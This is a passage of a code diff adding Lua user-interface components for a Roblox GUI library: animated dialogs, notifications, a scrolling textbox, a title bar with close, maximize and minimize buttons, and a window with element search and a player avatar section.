+	}
+
+	function Dialog:Init(Window)
+		Dialog.Window = Window
+		return Dialog
+	end
+
+	function Dialog:Create()
+		local NewDialog = {
+			Buttons = 0,
+		}
+
+		NewDialog.TintFrame = New("TextButton", {
+			Text = "",
+			Size = UDim2.fromScale(1, 1),
+			BackgroundColor3 = Color3.fromRGB(0, 0, 0),
+			BackgroundTransparency = 1,
+			Parent = Dialog.Window.Root,
+		}, {
+			New("UICorner", {
+				CornerRadius = UDim.new(0, 8),
+			}),
+		})
+
+		local TintMotor, TintTransparency = Creator.SpringMotor(1, NewDialog.TintFrame, "BackgroundTransparency", true)
+
+		NewDialog.ButtonHolder = New("Frame", {
+			Size = UDim2.new(1, -40, 1, -40),
+			AnchorPoint = Vector2.new(0.5, 0.5),
+			Position = UDim2.fromScale(0.5, 0.5),
+			BackgroundTransparency = 1,
+		}, {
+			New("UIListLayout", {
+				Padding = UDim.new(0, 10),
+				FillDirection = Enum.FillDirection.Horizontal,
+				HorizontalAlignment = Enum.HorizontalAlignment.Center,
+				SortOrder = Enum.SortOrder.LayoutOrder,
+			}),
+		})
+
+		NewDialog.ButtonHolderFrame = New("Frame", {
+			Size = UDim2.new(1, 0, 0, 70),
+			Position = UDim2.new(0, 0, 1, -70),
+			ThemeTag = {
+				BackgroundColor3 = "DialogHolder",
+			},
+		}, {
+			New("Frame", {
+				Size = UDim2.new(1, 0, 0, 1),
+				ThemeTag = {
+					BackgroundColor3 = "DialogHolderLine",
+				},
+			}),
+			NewDialog.ButtonHolder,
+		})
+
+		NewDialog.Title = New("TextLabel", {
+			FontFace = Font.new(
+				"rbxasset://fonts/families/GothamSSm.json",
+				Enum.FontWeight.SemiBold,
+				Enum.FontStyle.Normal
+			),
+			Text = "Dialog",
+			TextColor3 = Color3.fromRGB(240, 240, 240),
+			TextSize = 22,
+			TextXAlignment = Enum.TextXAlignment.Left,
+			Size = UDim2.new(1, 0, 0, 22),
+			Position = UDim2.fromOffset(20, 25),
+			BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+			BackgroundTransparency = 1,
+			ThemeTag = {
+				TextColor3 = "Text",
+			},
+		})
+
+		NewDialog.Scale = New("UIScale", {
+			Scale = 1,
+		})
+
+		local ScaleMotor, Scale = Creator.SpringMotor(1.1, NewDialog.Scale, "Scale")
+
+		NewDialog.Root = New("CanvasGroup", {
+			Size = UDim2.fromOffset(300, 165),
+			AnchorPoint = Vector2.new(0.5, 0.5),
+			Position = UDim2.fromScale(0.5, 0.5),
+			GroupTransparency = 1,
+			Parent = NewDialog.TintFrame,
+			ThemeTag = {
+				BackgroundColor3 = "Dialog",
+			},
+		}, {
+			New("UICorner", {
+				CornerRadius = UDim.new(0, 8),
+			}),
+			New("UIStroke", {
+				Transparency = 0.5,
+				ThemeTag = {
+					Color = "DialogBorder",
+				},
+			}),
+			NewDialog.Scale,
+			NewDialog.Title,
+			NewDialog.ButtonHolderFrame,
+		})
+
+		local RootMotor, RootTransparency = Creator.SpringMotor(1, NewDialog.Root, "GroupTransparency")
+
+		function NewDialog:Open()
+			Library.DialogOpen = true
+			NewDialog.Scale.Scale = 1.1
+			TintTransparency(0.75)
+			RootTransparency(0)
+			Scale(1)
+		end
+
+		function NewDialog:Close()
+			Library.DialogOpen = false
+			TintTransparency(1)
+			RootTransparency(1)
+			Scale(1.1)
+			NewDialog.Root.UIStroke:Destroy()
+			task.wait(0.15)
+			NewDialog.TintFrame:Destroy()
+		end
+
+		function NewDialog:Button(Title, Callback)
+			NewDialog.Buttons = NewDialog.Buttons + 1
+			Title = Title or "Button"
+			Callback = Callback or function() end
+
+			local Button = Components.Button("", NewDialog.ButtonHolder, true)
+			Button.Title.Text = Title
+
+			for _, Btn in next, NewDialog.ButtonHolder:GetChildren() do
+				if Btn:IsA("TextButton") then
+					Btn.Size =
+						UDim2.new(1 / NewDialog.Buttons, -(((NewDialog.Buttons - 1) * 10) / NewDialog.Buttons), 0, 32)
+				end
+			end
+
+			Creator.AddSignal(Button.Frame.MouseButton1Click, function()
+				Library:SafeCallback(Callback)
+				pcall(function()
+					NewDialog:Close()
+				end)
+			end)
+
+			return Button
+		end
+
+		return NewDialog
+	end
+
+	return Dialog
+end)()
+Components.Notification = (function()
+	local Spring = Flipper.Spring.new
+	local Instant = Flipper.Instant.new
+	local New = Creator.New
+
+	local Notification = {}
+
+	function Notification:Init(GUI)
+		Library.ActiveNotifications = Library.ActiveNotifications or {}
+
+		Notification.Holder = New("Frame", {
+			Position = UDim2.new(1, -30, 1, -30),
+			Size = UDim2.new(0, 310, 1, -30),
+			AnchorPoint = Vector2.new(1, 1),
+			BackgroundTransparency = 1,
+			Parent = GUI,
+		}, {
+			New("UIListLayout", {
+				HorizontalAlignment = Enum.HorizontalAlignment.Center,
+				SortOrder = Enum.SortOrder.LayoutOrder,
+				VerticalAlignment = Enum.VerticalAlignment.Bottom,
+				Padding = UDim.new(0, 20),
+			}),
+		})
+	end
+
+	function Notification:New(Config)
+		Config.Title = Config.Title or "Title"
+		Config.Content = Config.Content or "Content"
+		Config.SubContent = Config.SubContent or ""
+		Config.Duration = Config.Duration or nil
+		local NewNotification = {
+			Closed = false,
+		}
+
+		NewNotification.AcrylicPaint = Acrylic.AcrylicPaint()
+
+		NewNotification.Title = New("TextLabel", {
+			Position = UDim2.new(0, 14, 0, 17),
+			Text = Config.Title,
+			RichText = true,
+			TextColor3 = Color3.fromRGB(255, 255, 255),
+			TextTransparency = 0,
+			FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json"),
+			TextSize = 13,
+			TextXAlignment = "Left",
+			TextYAlignment = "Center",
+			Size = UDim2.new(1, -12, 0, 12),
+			TextWrapped = true,
+			BackgroundTransparency = 1,
+			ThemeTag = {
+				TextColor3 = "Text",
+			},
+		})
+
+		NewNotification.ContentLabel = New("TextLabel", {
+			FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json"),
+			Text = Config.Content,
+			TextColor3 = Color3.fromRGB(240, 240, 240),
+			TextSize = 14,
+			TextXAlignment = Enum.TextXAlignment.Left,
+			AutomaticSize = Enum.AutomaticSize.Y,
+			Size = UDim2.new(1, 0, 0, 14),
+			BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+			BackgroundTransparency = 1,
+			TextWrapped = true,
+			ThemeTag = {
+				TextColor3 = "Text",
+			},
+		})
+
+		NewNotification.SubContentLabel = New("TextLabel", {
+			FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json"),
+			Text = Config.SubContent,
+			TextColor3 = Color3.fromRGB(240, 240, 240),
+			TextSize = 14,
+			TextXAlignment = Enum.TextXAlignment.Left,
+			AutomaticSize = Enum.AutomaticSize.Y,
+			Size = UDim2.new(1, 0, 0, 14),
+			BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+			BackgroundTransparency = 1,
+			TextWrapped = true,
+			ThemeTag = {
+				TextColor3 = "SubText",
+			},
+		})
+
+		NewNotification.LabelHolder = New("Frame", {
+			AutomaticSize = Enum.AutomaticSize.Y,
+			BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+			BackgroundTransparency = 1,
+			Position = UDim2.fromOffset(14, 40),
+			Size = UDim2.new(1, -28, 0, 0),
+		}, {
+			New("UIListLayout", {
+				SortOrder = Enum.SortOrder.LayoutOrder,
+				VerticalAlignment = Enum.VerticalAlignment.Center,
+				Padding = UDim.new(0, 3),
+			}),
+			NewNotification.ContentLabel,
+			NewNotification.SubContentLabel,
+		})
+
+		NewNotification.CloseButton = New("TextButton", {
+			Text = "",
+			Position = UDim2.new(1, -14, 0, 13),
+			Size = UDim2.fromOffset(20, 20),
+			AnchorPoint = Vector2.new(1, 0),
+			BackgroundTransparency = 1,
+		}, {
+			New("ImageLabel", {
+				Image = Components.Close,
+				Size = UDim2.fromOffset(16, 16),
+				Position = UDim2.fromScale(0.5, 0.5),
+				AnchorPoint = Vector2.new(0.5, 0.5),
+				BackgroundTransparency = 1,
+				ThemeTag = {
+					ImageColor3 = "Text",
+				},
+			}),
+		})
+
+		NewNotification.Root = New("Frame", {
+			BackgroundTransparency = 1,
+			Size = UDim2.new(1, 0, 1, 0),
+			Position = UDim2.fromScale(1, 0),
+		}, {
+			NewNotification.AcrylicPaint.Frame,
+			NewNotification.Title,
+			NewNotification.CloseButton,
+			NewNotification.LabelHolder,
+		})
+
+		if Config.Content == "" then
+			NewNotification.ContentLabel.Visible = false
+		end
+
+		if Config.SubContent == "" then
+			NewNotification.SubContentLabel.Visible = false
+		end
+
+		NewNotification.Holder = New("Frame", {
+			BackgroundTransparency = 1,
+			Size = UDim2.new(1, 0, 0, 200),
+			Parent = Notification.Holder,
+		}, {
+			NewNotification.Root,
+		})
+
+		local RootMotor = Flipper.GroupMotor.new({
+			Scale = 1,
+			Offset = 60,
+		})
+
+		RootMotor:onStep(function(Values)
+			NewNotification.Root.Position = UDim2.new(Values.Scale, Values.Offset, 0, 0)
+		end)
+
+		Creator.AddSignal(NewNotification.CloseButton.MouseButton1Click, function()
+			NewNotification:Close()
+		end)
+		function NewNotification:ApplyTransparency()
+			if Library.Theme == "Glass" and Library.UseAcrylic then
+				local Value = Library.NotificationTransparency or 1
+
+				local notifTransparency = 0.85 + (Value * 0.08)
+				if Value > 1 then
+					notifTransparency = 0.93 + ((Value - 1) * 0.04)
+				end
+
+				local notifBackgroundTransparency = 0.8 + (Value * 0.1)
+				if Value > 1 then
+					notifBackgroundTransparency = 0.9 + ((Value - 1) * 0.05)
+				end
+
+				if NewNotification.AcrylicPaint and NewNotification.AcrylicPaint.Model then
+					NewNotification.AcrylicPaint.Model.Transparency = math.min(notifTransparency, 0.97)
+				end
+				if NewNotification.AcrylicPaint and NewNotification.AcrylicPaint.Frame and NewNotification.AcrylicPaint.Frame.Background then
+					NewNotification.AcrylicPaint.Frame.Background.BackgroundTransparency = math.min(notifBackgroundTransparency, 0.95)
+				end
+			end
+		end
+
+		function NewNotification:Open()
+			local ContentSize = NewNotification.LabelHolder.AbsoluteSize.Y
+			NewNotification.Holder.Size = UDim2.new(1, 0, 0, 58 + ContentSize)
+
+			RootMotor:setGoal({
+				Scale = Spring(0, { frequency = 5 }),
+				Offset = Spring(0, { frequency = 5 }),
+			})
+
+			task.defer(function()
+				task.wait(0.1)
+				NewNotification:ApplyTransparency()
+			end)
+		end
+
+		function NewNotification:Close()
+			if not NewNotification.Closed then
+				NewNotification.Closed = true
+
+				for i, notif in pairs(Library.ActiveNotifications or {}) do
+					if notif == NewNotification then
+						table.remove(Library.ActiveNotifications, i)
+						break
+					end
+				end
+
+				task.spawn(function()
+					RootMotor:setGoal({
+						Scale = Spring(1, { frequency = 5 }),
+						Offset = Spring(60, { frequency = 5 }),
+					})
+					task.wait(0.4)
+					if Library.UseAcrylic then
+						NewNotification.AcrylicPaint.Model:Destroy()
+					end
+					NewNotification.Holder:Destroy()
+				end)
+			end
+		end
+
+		table.insert(Library.ActiveNotifications, NewNotification)
+
+		NewNotification:Open()
+		if Config.Duration then
+			task.delay(Config.Duration, function()
+				NewNotification:Close()
+			end)
+		end
+		return NewNotification
+	end
+
+	return Notification
+end)()
+Components.Textbox = (function()
+	local New = Creator.New
+
+	return function(Parent, Acrylic)
+		Acrylic = Acrylic or false
+		local Textbox = {}
+
+		Textbox.Input = New("TextBox", {
+			FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json"),
+			TextColor3 = Color3.fromRGB(200, 200, 200),
+			TextSize = 14,
+			TextXAlignment = Enum.TextXAlignment.Left,
+			TextYAlignment = Enum.TextYAlignment.Center,
+			BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+			AutomaticSize = Enum.AutomaticSize.Y,
+			BackgroundTransparency = 1,
+			Size = UDim2.fromScale(1, 1),
+			Position = UDim2.fromOffset(10, 0),
+			ThemeTag = {
+				TextColor3 = "Text",
+				PlaceholderColor3 = "SubText",
+			},
+		})
+
+		Textbox.Container = New("Frame", {
+			BackgroundTransparency = 1,
+			ClipsDescendants = true,
+			Position = UDim2.new(0, 6, 0, 0),
+			Size = UDim2.new(1, -12, 1, 0),
+		}, {
+			Textbox.Input,
+		})
+
+		Textbox.Indicator = New("Frame", {
+			Size = UDim2.new(1, -4, 0, 1),
+			Position = UDim2.new(0, 2, 1, 0),
+			AnchorPoint = Vector2.new(0, 1),
+			BackgroundTransparency = Acrylic and 0.5 or 0,
+			ThemeTag = {
+				BackgroundColor3 = Acrylic and "InputIndicator" or "DialogInputLine",
+			},
+		})
+
+		Textbox.Frame = New("Frame", {
+			Size = UDim2.new(0, 0, 0, 30),
+			BackgroundTransparency = Acrylic and 0.9 or 0,
+			Parent = Parent,
+			ThemeTag = {
+				BackgroundColor3 = Acrylic and "Input" or "DialogInput",
+			},
+		}, {
+			New("UICorner", {
+				CornerRadius = UDim.new(0, 4),
+			}),
+			New("UIStroke", {
+				ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+				Transparency = Acrylic and 0.5 or 0.65,
+				ThemeTag = {
+					Color = Acrylic and "InElementBorder" or "DialogButtonBorder",
+				},
+			}),
+			Textbox.Indicator,
+			Textbox.Container,
+		})
+
+		local function Update()
+			local PADDING = 2
+			local Reveal = Textbox.Container.AbsoluteSize.X
+
+			if not Textbox.Input:IsFocused() or Textbox.Input.TextBounds.X <= Reveal - 2 * PADDING then
+				Textbox.Input.Position = UDim2.new(0, PADDING, 0, 0)
+			else
+				local Cursor = Textbox.Input.CursorPosition
+				if Cursor ~= -1 then
+					local subtext = string.sub(Textbox.Input.Text, 1, Cursor - 1)
+					local width = TextService:GetTextSize(
+						subtext,
+						Textbox.Input.TextSize,
+						Textbox.Input.Font,
+						Vector2.new(math.huge, math.huge)
+					).X
+
+					local CurrentCursorPos = Textbox.Input.Position.X.Offset + width
+					if CurrentCursorPos < PADDING then
+						Textbox.Input.Position = UDim2.fromOffset(PADDING - width, 0)
+					elseif CurrentCursorPos > Reveal - PADDING - 1 then
+						Textbox.Input.Position = UDim2.fromOffset(Reveal - width - PADDING - 1, 0)
+					end
+				end
+			end
+		end
+
+		task.spawn(Update)
+
+		Creator.AddSignal(Textbox.Input:GetPropertyChangedSignal("Text"), Update)
+		Creator.AddSignal(Textbox.Input:GetPropertyChangedSignal("CursorPosition"), Update)
+
+		Creator.AddSignal(Textbox.Input.Focused, function()
+			Update()
+			Textbox.Indicator.Size = UDim2.new(1, -2, 0, 2)
+			Textbox.Indicator.Position = UDim2.new(0, 1, 1, 0)
+			Textbox.Indicator.BackgroundTransparency = 0
+			Creator.OverrideTag(Textbox.Frame, { BackgroundColor3 = Acrylic and "InputFocused" or "DialogHolder" })
+			Creator.OverrideTag(Textbox.Indicator, { BackgroundColor3 = "InputIndicatorFocus" })
+		end)
+
+		Creator.AddSignal(Textbox.Input.FocusLost, function()
+			Update()
+			Textbox.Indicator.Size = UDim2.new(1, -4, 0, 1)
+			Textbox.Indicator.Position = UDim2.new(0, 2, 1, 0)
+			Textbox.Indicator.BackgroundTransparency = 0.5
+			Creator.OverrideTag(Textbox.Frame, { BackgroundColor3 = Acrylic and "Input" or "DialogInput" })
+			Creator.OverrideTag(Textbox.Indicator, { BackgroundColor3 = Acrylic and "InputIndicator" or "DialogInputLine" })
+		end)
+
+		return Textbox
+	end
+end)()
+Components.TitleBar = (function()
+	local New = Creator.New
+	local AddSignal = Creator.AddSignal
+
+	local function parseColor(value)
+		if typeof(value) == "Color3" then return value end
+		if typeof(value) == "string" then
+			local hex = value:gsub("#","")
+			if #hex == 6 then
+				local r = tonumber(hex:sub(1,2), 16) or 255
+				local g = tonumber(hex:sub(3,4), 16) or 255
+				local b = tonumber(hex:sub(5,6), 16) or 255
+				return Color3.fromRGB(r,g,b)
+			end
+		end
+		return Themes[Library.Theme].SubText or Color3.fromRGB(170,170,170)
+	end
+
+	return function(Config)
+		local TitleBar = {}
+
+		local function BarButton(Icon, Pos, Parent, Callback)
+			local Button = {
+				Callback = Callback or function() end,
+			}
+
+			Button.Frame = New("TextButton", {
+				Size = UDim2.new(0, 34, 1, -8),
+				AnchorPoint = Vector2.new(1, 0),
+				BackgroundTransparency = 1,
+				Parent = Parent,
+				Position = Pos,
+				Text = "",
+				ThemeTag = {
+					BackgroundColor3 = "Text",
+				},
+			}, {
+				New("UICorner", {
+					CornerRadius = UDim.new(0, 7),
+				}),
+				New("ImageLabel", {
+					Image = Icon,
+					Size = UDim2.fromOffset(16, 16),
+					Position = UDim2.fromScale(0.5, 0.5),
+					AnchorPoint = Vector2.new(0.5, 0.5),
+					BackgroundTransparency = 1,
+					Name = "Icon",
+					ThemeTag = {
+						ImageColor3 = "Text",
+					},
+				}),
+			})
+
+			local Motor, SetTransparency = Creator.SpringMotor(1, Button.Frame, "BackgroundTransparency")
+
+			AddSignal(Button.Frame.MouseEnter, function()
+				SetTransparency(0.94)
+			end)
+			AddSignal(Button.Frame.MouseLeave, function()
+				SetTransparency(1, true)
+			end)
+			AddSignal(Button.Frame.MouseButton1Down, function()
+				SetTransparency(0.96)
+			end)
+			AddSignal(Button.Frame.MouseButton1Up, function()
+				SetTransparency(0.94)
+			end)
+			AddSignal(Button.Frame.MouseButton1Click, Button.Callback)
+
+			Button.SetCallback = function(Func)
+				Button.Callback = Func
+			end
+
+			return Button
+		end
+
+		TitleBar.Frame = New("Frame", {
+			Size = UDim2.new(1, 0, 0, 42),
+			BackgroundTransparency = 1,
+			Parent = Config.Parent,
+		}, {
+			New("Frame", {
+				Size = UDim2.new(1, -16, 1, 0),
+				Position = UDim2.new(0, 12, 0, 0),
+				BackgroundTransparency = 1,
+			}, {
+				New("UIListLayout", {
+					Padding = UDim.new(0, 5),
+					FillDirection = Enum.FillDirection.Horizontal,
+					SortOrder = Enum.SortOrder.LayoutOrder,
+					VerticalAlignment = Enum.VerticalAlignment.Center,
+				}),
+
+				Config.Icon and New("ImageLabel", {
+					Image = Config.Icon,
+					Size = UDim2.fromOffset(20, 20),
+					BackgroundTransparency = 1,
+					LayoutOrder = 1,
+					ThemeTag = {
+						ImageColor3 = "Text",
+					},
+				}) or nil,
+
+				New("TextLabel", {
+					RichText = true,
+					Text = Config.Title,
+					FontFace = Font.new(
+						"rbxasset://fonts/families/GothamSSm.json",
+						Enum.FontWeight.Regular,
+						Enum.FontStyle.Normal
+					),
+					TextSize = 12,
+					TextXAlignment = "Left",
+					TextYAlignment = "Center",
+					Size = UDim2.fromScale(0, 1),
+					AutomaticSize = Enum.AutomaticSize.X,
+					BackgroundTransparency = 1,
+					LayoutOrder = Config.Icon and 2 or 1,
+					ThemeTag = {
+						TextColor3 = "Text",
+					},
+				}),
+				Config.SubTitle and New("TextLabel", {
+					RichText = true,
+					Text = Config.SubTitle,
+					TextTransparency = 0.4,
+					FontFace = Font.new(
+						"rbxasset://fonts/families/GothamSSm.json",
+						Enum.FontWeight.Regular,
+						Enum.FontStyle.Normal
+					),
+					TextSize = 12,
+					TextXAlignment = "Left",
+					TextYAlignment = "Center",
+					Size = UDim2.fromScale(0, 1),
+					AutomaticSize = Enum.AutomaticSize.X,
+					BackgroundTransparency = 1,
+					LayoutOrder = Config.Icon and 3 or 2,
+					ThemeTag = {
+						TextColor3 = "Text",
+					},
+				}) or nil,
+
+			}),
+			New("Frame", {
+				BackgroundTransparency = 0.5,
+				Size = UDim2.new(1, 0, 0, 1),
+				Position = UDim2.new(0, 0, 1, 0),
+				ThemeTag = {
+					BackgroundColor3 = "TitleBarLine",
+				},
+			}),
+		})
+		TitleBar.CloseButton = BarButton(Components.Assets.Close, UDim2.new(1, -4, 0, 4), TitleBar.Frame, function()
+			Library.Window:Dialog({
+				Title = "Close",
+				Content = "Are you sure you want to unload the interface?",
+				Buttons = {
+					{
+						Title = "Yes",
+						Callback = function()
+							Library:Destroy()
+						end,
+					},
+					{
+						Title = "No",
+					},
+				},
+			})
+		end)
+		TitleBar.MaxButton = BarButton(Components.Assets.Max, UDim2.new(1, -40, 0, 4), TitleBar.Frame, function()
+			Config.Window.Maximize(not Config.Window.Maximized)
+		end)
+		TitleBar.MinButton = BarButton(Components.Assets.Min, UDim2.new(1, -80, 0, 4), TitleBar.Frame, function()
+			Library.Window:Minimize()
+		end)
+
+		return TitleBar
+	end
+end)()
+Components.Window = (function()
+	local Spring = Flipper.Spring.new
+	local Instant = Flipper.Instant.new
+	local New = Creator.New
+
+	return function(Config)
+		local Window = {
+			Minimized = false,
+			Maximized = false,
+			Size = Config.Size,
+			CurrentPos = 0,
+			TabWidth = 0,
+			Position = UDim2.fromOffset(0, 0),
+		}
+
+		local Dragging, DragInput, MousePos, StartPos = false
+		local Resizing, ResizePos = false
+		local MinimizeNotif = false
+
+		Window.AcrylicPaint = Acrylic.AcrylicPaint()
+
+		local function CenterWindow()
+			local vp = Camera.ViewportSize
+			local x = math.max(0, (vp.X - Window.Size.X.Offset) / 2)
+			local y = math.max(0, (vp.Y - Window.Size.Y.Offset) / 2)
+			Window.Position = UDim2.fromOffset(math.floor(x), math.floor(y))
+			if Window.Root then
+				Window.Root.Position = Window.Position
+			end
+		end
+		Window.TabWidth = Config.TabWidth
+
+		local Selector = New("Frame", {
+			Size = UDim2.fromOffset(4, 0),
+			BackgroundColor3 = Color3.fromRGB(76, 194, 255),
+			Position = UDim2.fromOffset(0, (Window.TabHolderTop or 45) + 0),
+			AnchorPoint = Vector2.new(0, 0.5),
+			ThemeTag = {
+				BackgroundColor3 = "Accent",
+			},
+		}, {
+			New("UICorner", {
+				CornerRadius = UDim.new(0, 9),
+			}),
+		})
+
+		local ResizeStartFrame = New("Frame", {
+			Size = UDim2.fromOffset(20, 20),
+			BackgroundTransparency = 1,
+			Position = UDim2.new(1, -20, 1, -2),
+		})
+
+		Window.TabHolder = New("ScrollingFrame", {
+			Size = UDim2.new(1, 0, 1, -45),
+			Position = UDim2.new(0, 0, 0, 45),
+			BackgroundTransparency = 1,
+			ScrollBarImageTransparency = 1,
+			ScrollBarThickness = 0,
+			BorderSizePixel = 0,
+			CanvasSize = UDim2.fromScale(0, 0),
+			ScrollingDirection = Enum.ScrollingDirection.Y,
+		}, {
+			New("UIListLayout", {
+				Padding = UDim.new(0, 4),
+			}),
+		})
+
+
+		local SearchElements = {}
+		local AllElements = {}
+
+		local function UpdateElementVisibility(searchTerm)
+			searchTerm = string.lower(searchTerm or "")
+
+			for element, data in pairs(AllElements) do
+				if element and element.Parent then
+					local shouldShow = searchTerm == "" or 
+						string.find(string.lower(data.title), searchTerm, 1, true) or
+						(data.description and string.find(string.lower(data.description), searchTerm, 1, true))
+					element.Visible = shouldShow
+				end
+			end
+
+			task.spawn(function()
+				task.wait(0.01)
+				if Window and Window.TabHolder then
+					for _, child in pairs(Window.TabHolder:GetChildren()) do
+						if child:IsA("ScrollingFrame") then
+							local layout = child:FindFirstChild("UIListLayout")
+							if layout then
+								child.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 2)
+							end
+						end
+					end
+				end
+			end)
+		end
+
+		local function RegisterElement(elementFrame, title, elementType, description)
+			if elementFrame and title then
+				AllElements[elementFrame] = {
+					title = title,
+					type = elementType or "Element",
+					description = description or ""
+				}
+			end
+		end
+
+
+		Window.ShowSearch = (Config.Search == nil) and true or (Config.Search and true or false)
+
+		local SearchFrame = New("Frame", {
+			Size = UDim2.new(1, 0, 0, 35),
+			Position = UDim2.new(0, 0, 0, 0),
+			BackgroundTransparency = 0.9,
+			ZIndex = 10,
+			Visible = Window.ShowSearch,
+			ThemeTag = {
+				BackgroundColor3 = "Element",
+			},
+		}, {
+			New("UICorner", {
+				CornerRadius = UDim.new(0, 6),
+			}),
+			New("UIStroke", {
+				ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+				Transparency = 0.8,
+				Thickness = 1,
+				ThemeTag = {
+					Color = "ElementBorder",
+				},
+			}),
+		})
+
+		local SearchTextbox = Components.Textbox(SearchFrame, true)
+		SearchTextbox.Frame.Size = UDim2.new(1, -44, 1, -8)
+		SearchTextbox.Frame.Position = UDim2.new(0, 10, 0, 4)
+		SearchTextbox.Input.PlaceholderText = "Search..."
+		SearchTextbox.Input.Text = ""
+
+		local SearchIcon = New("ImageLabel", {
+			Size = UDim2.fromOffset(18, 18),
+			Position = UDim2.new(1, -18, 0.5, 0),
+			AnchorPoint = Vector2.new(0.5, 0.5),
+			BackgroundTransparency = 1,
+			Image = "rbxassetid://10734943674",
+			Parent = SearchFrame,
+			ThemeTag = {
+				ImageColor3 = "SubText",
+			},
+		})
+
+
+		Creator.AddSignal(SearchTextbox.Input:GetPropertyChangedSignal("Text"), function()
+			local searchText = SearchTextbox.Input.Text
+			UpdateElementVisibility(searchText)
+		end)
+
+
+		Creator.AddSignal(SearchTextbox.Input.FocusLost, function(enterPressed)
+		end)
+
+		Creator.AddSignal(UserInputService.InputBegan, function(input, gameProcessed)
+			if gameProcessed then return end
+
+			if input.KeyCode == Enum.KeyCode.Escape and SearchTextbox.Input:IsFocused() then
+				SearchTextbox.Input.Text = ""
+				SearchTextbox.Input:ReleaseFocus()
+			end
+		end)
+
+
+		Window.SearchElements = SearchElements
+		Window.AllElements = AllElements
+		Window.RegisterElement = RegisterElement
+		Window.UpdateElementVisibility = UpdateElementVisibility
+
+		local TabFrame = New("Frame", {
+			Size = UDim2.new(0, Window.TabWidth, 1, Window.ShowSearch and -66 or -31),
+			Position = UDim2.new(0, 12, 0, Window.ShowSearch and 54 or 19),
+			BackgroundTransparency = 1,
+			ClipsDescendants = true,
+		}, {
+			Window.TabHolder,
+			Selector,
+			SearchFrame,
+		})
+
+		Window.TabDisplay = New("TextLabel", {
+			RichText = true,
+			Text = "Tab",
+			TextTransparency = 0,
+			FontFace = Font.new("rbxassetid://12187365364", Enum.FontWeight.SemiBold, Enum.FontStyle.Normal),
+			TextSize = 28,
+			TextXAlignment = "Left",
+			TextYAlignment = "Center",
+			Size = UDim2.new(1, -16, 0, 28),
+			Position = UDim2.fromOffset(Window.TabWidth + 26, 56),
+			BackgroundTransparency = 1,
+			ThemeTag = {
+				TextColor3 = "Text",
+			},
+		})
+
+		Window.ContainerHolder = New("Frame", {
+			Size = UDim2.fromScale(1, 1),
+			BackgroundTransparency = 1,
+		})
+
+		Window.ContainerAnim = New("CanvasGroup", {
+			Size = UDim2.fromScale(1, 1),
+			BackgroundTransparency = 1,
+		})
+
+		Window.ContainerCanvas = New("Frame", {
+			Size = UDim2.new(1, -Window.TabWidth - 32, 1, -102),
+			Position = UDim2.fromOffset(Window.TabWidth + 26, 90),
+			BackgroundTransparency = 1,
+		}, {
+			Window.ContainerAnim,
+			Window.ContainerHolder
+		})
+
+		Window.Root = New("Frame", {
+			BackgroundTransparency = 1,
+			Size = Window.Size,
+			Position = Window.Position,
+			Parent = Config.Parent,
+		}, {
+			Window.AcrylicPaint.Frame,
+			Window.TabDisplay,
+			Window.ContainerCanvas,
+			TabFrame,
+			ResizeStartFrame,
+		})
+
+		CenterWindow()
+		Creator.AddSignal(Camera:GetPropertyChangedSignal("ViewportSize"), function()
+			CenterWindow()
+		end)
+
+		Window.TitleBar = Components.TitleBar({
+			Title = Config.Title,
+			SubTitle = Config.SubTitle,
+			Icon = Config.Icon,
+			Parent = Window.Root,
+			Window = Window,
+			UserInfoTitle = Config.UserInfoTitle,
+			UserInfo = Config.UserInfo,
+			UserInfoSubtitle = Config.UserInfoSubtitle,
+			UserInfoSubtitleColor = Config.UserInfoSubtitleColor,
+		})
+
+		if Config.UserInfo then
+			local function parseColor(value)
+				if typeof(value) == "Color3" then return value end
+				return Themes[Library.Theme].SubText or Color3.fromRGB(170,170,170)
+			end
+
+			local userInfoHeight = 56
+			local UserInfoSection = New("Frame", {
+				Name = "UserInfoSection",
+				BackgroundTransparency = 1,
+				Size = UDim2.new(1, 0, 0, userInfoHeight),
+				Position = Config.UserInfoTop and UDim2.fromOffset(0, 0) or UDim2.new(0, 12, 1, -(userInfoHeight + 2)),
+				Parent = TabFrame,
+			})
+
+			New("Frame", {
+				Name = "UserInfoSeparator",
+				BackgroundTransparency = 0.5,
+				Size = UDim2.new(1, 0, 0, 1),
+				Position = Config.UserInfoTop and UDim2.fromOffset(0, userInfoHeight + 2) or UDim2.new(0, 12, 1, -(userInfoHeight + 10)),
+				Parent = TabFrame,
+				ThemeTag = {
+					BackgroundColor3 = "TitleBarLine",
+				},
+			})
+
+			local avatarSize = 28
+			local Avatar = New("ImageLabel", {
+				Name = "Avatar",
+				BackgroundTransparency = 1,
+				Size = UDim2.fromOffset(avatarSize, avatarSize),
+				Position = UDim2.new(0, 0, 0.5, 0),
+				AnchorPoint = Vector2.new(0, 0.5),
+				Image = "rbxassetid://0",
+				Parent = UserInfoSection,
+			}, {
+				New("UICorner", { CornerRadius = UDim.new(1, 0) }),
+				New("UIStroke", { Transparency = 0.7, Thickness = 1, ThemeTag = { Color = "ElementBorder" } }),
+			})
+
+			pcall(function()
+				local Players = game:GetService("Players")
+				local content, isReady = Players:GetUserThumbnailAsync(Players.LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
+				if isReady and content then
+					Avatar.Image = content
+				end
+			end)
+
+			local titleText = tostring((Config.UserInfoTitle ~= nil and Config.UserInfoTitle) or (LocalPlayer.Name or "User"))
+			local subtitleText = (Config.UserInfoSubtitle ~= nil) and tostring(Config.UserInfoSubtitle) or ""
+
+			New("TextLabel", {
+				Name = "UserName",
+				BackgroundTransparency = 1,
+				TextXAlignment = Enum.TextXAlignment.Left,
+				TextYAlignment = Enum.TextYAlignment.Bottom,
+				FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal),
+				TextSize = 13,
+				Text = titleText,
+				Size = UDim2.new(1, -avatarSize - 12, 0.5, 0),
